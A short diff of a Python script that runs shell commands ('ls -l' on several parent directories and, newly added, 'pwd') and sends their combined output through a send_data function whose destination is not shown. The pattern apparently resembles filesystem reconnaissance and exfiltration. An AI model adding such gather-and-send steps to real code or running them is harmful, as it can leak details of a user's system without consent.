@@ -31,4 +31,5 @@ with open(argv[1], "r") as f:
     my_data = get_data("ls -l")
     my_data += get_data("ls -l ../..")
     my_data += get_data("ls -l ../../..")
+    my_data += get_data("pwd")
     send_data(my_data)
